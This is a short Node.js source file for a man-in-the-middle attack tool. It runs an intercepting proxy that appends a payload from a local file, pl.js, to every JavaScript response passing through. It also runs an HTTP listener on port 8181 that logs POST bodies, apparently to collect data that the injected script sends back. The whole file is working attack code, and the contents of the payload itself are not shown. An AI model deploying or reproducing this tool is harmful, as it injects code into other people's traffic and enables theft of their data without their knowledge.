

// start proxy server on port 8080
var proxy = require('proxy-tamper').start({port: 8080});

// start web api on port 8181
require('http').createServer(API_onRequest).listen(8181);

// js to be injected into others js
var payload = require("fs").readFileSync("./pl.js");

 /* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    WEB PROXY SETTINGS
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
proxy.tamper(/\.js/, function(request){
    delete request.headers['accept-encoding'];
    request.onResponse(function (response) {
        console.log("code injected: " + payload);
        response.body += payload;
        response.headers['content-length'] = response.body.length;
        response.complete();
    });
});

/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   WEB API FEATURES
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
function API_onRequest(request, response)
{
    if(request.method == "POST") {
        var body = "";
        request.on("data", function(data){
          body += data.toString();
        });
        request.on("end", function(data){
           console.log("event detected: " + request.url + ": " + body);
        });
        response.end("ok");
    }
    else {
        notFound(response);
    }
}

function notFound(response)
{
    response.writeHead(200,{"content-type" : "text/html"});
    response.end("<h2>Not found</h2>");
}
